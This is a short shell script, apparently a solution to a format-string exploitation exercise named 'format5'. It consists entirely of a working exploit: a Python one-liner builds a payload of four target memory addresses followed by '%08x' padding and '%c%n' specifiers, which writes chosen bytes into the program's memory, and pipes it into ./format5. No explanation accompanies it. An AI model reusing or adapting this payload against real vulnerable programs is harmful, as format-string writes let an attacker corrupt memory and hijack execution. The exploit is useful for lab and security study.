#!/bin/sh

#gcc -o format5 -m32 format5.c
python -c "print '\x1c\xa0\x04\x08AAAA\x1d\xa0\x04\x08AAAA\x1e\xa0\x04\x08AAAA\x1f\xa0\x04\x08'+'%08x'*5+'%167c%n%153c%n%128c%n%4c%n'" |./format5
